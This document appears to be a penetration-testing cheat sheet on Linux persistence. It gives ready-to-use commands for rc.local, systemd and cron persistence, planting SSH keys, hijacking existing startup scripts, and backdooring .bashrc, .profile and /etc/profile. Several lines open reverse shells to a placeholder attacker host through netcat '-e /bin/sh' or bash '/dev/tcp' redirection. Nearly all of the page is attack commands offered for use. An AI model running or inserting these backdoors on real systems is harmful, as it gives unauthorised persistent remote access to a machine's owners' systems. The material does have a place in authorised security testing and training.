---
tags:
  - Foundational
  - Linux
  - Persistence
---

## rc.local Persistence
resources: [HackTricks - Linux Persistence](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html)

> Execute commands on system startup via rc.local.

### Add Command to rc.local
```bash
# Edit rc.local directly
nano /etc/rc.local
```

```bash
# Or append command to rc.local
echo "<FullPathToScript>" >> /etc/rc.local
```

> The full path to the script or binary will be executed on system startup.

## Linux Service Persistence

> Create a systemd service for persistent execution.

### Create Service File
```bash
nano /etc/systemd/system/<ServiceName>.service
```

### Service File Contents
> Add the following content to the service file. Replace `<FullPathToScript>` with the full path to the .sh file to execute on startup.

```ini
[Unit]
After=network.target
Description=My Service description

[Service]
Type=simple
Restart=always
ExecStart=<FullPathToScript>

[Install]
WantedBy=multi-user.target
```

> When done editing with nano, press CTRL+X, then press 'Y', then press 'Enter' to save and close.

### Enable and Start Service
```bash
# Reload service manager
systemctl daemon-reload

# Enable the service to start on boot
systemctl enable <ServiceName>.service

# Start the service immediately
systemctl start <ServiceName>.service
```

## Crontab Persistence

> Schedule persistent tasks using cron.
>
> More info at: https://crontab.guru/

### Reverse Shell Cron (Daily at Midnight)
```bash
# Open crontab editor
crontab -e

# Add the following line at the end:
0 0 * * * nc <AttackerIP> <AttackerPort> -e /bin/sh
```

### Run Payload Daily at Midnight
```bash
# Open crontab editor
crontab -e

# Add the following line at the end:
0 0 * * * <FullPathToPayload>
```

## SSH Key Persistence

### Add Authorized Key
```bash
echo "<PublicKey>" >> /home/<User>/.ssh/authorized_keys
echo "<PublicKey>" >> /root/.ssh/authorized_keys
```

### Generate Key Pair [Local]
```bash
ssh-keygen -t rsa -b 4096 -f persistence_key -N ""
```

### Create .ssh Directory if Missing
```bash
mkdir -p /home/<User>/.ssh
chmod 700 /home/<User>/.ssh
touch /home/<User>/.ssh/authorized_keys
chmod 600 /home/<User>/.ssh/authorized_keys
```

## Poisoning Existing Scripts

> Hijack existing persistence mechanisms.

### Enumeration Strategy
> Enumerate all persistence methods discussed in this section looking for existing persistence that has been created via script files such as .sh, .py, etc. If those are modifiable, modify them to launch a malicious uploaded payload.

```bash
# Check rc.local for existing scripts
cat /etc/rc.local

# List systemd services
ls -la /etc/systemd/system/

# List init.d scripts
ls -la /etc/init.d/

# List user crontabs
crontab -l

# List system crontabs
cat /etc/crontab
ls -la /etc/cron.d/
ls -la /etc/cron.daily/
ls -la /etc/cron.hourly/
ls -la /etc/cron.monthly/
ls -la /etc/cron.weekly/
```

## Bashrc and Profile Backdoors

### .bashrc Backdoor
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.bashrc
```

### .profile Backdoor
```bash
echo 'nohup bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> ~/.profile
```

### .bash_profile Backdoor
```bash
echo 'nohup nc -e /bin/bash <AttackerIP> <Port> &' >> ~/.bash_profile
```

## System-Wide Persistence (Requires Root)

### /etc/profile Backdoor
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/profile
```

### /etc/bash.bashrc Backdoor
```bash
echo 'bash -i >& /dev/tcp/<AttackerIP>/<Port> 0>&1 &' >> /etc/bash.bashrc
```
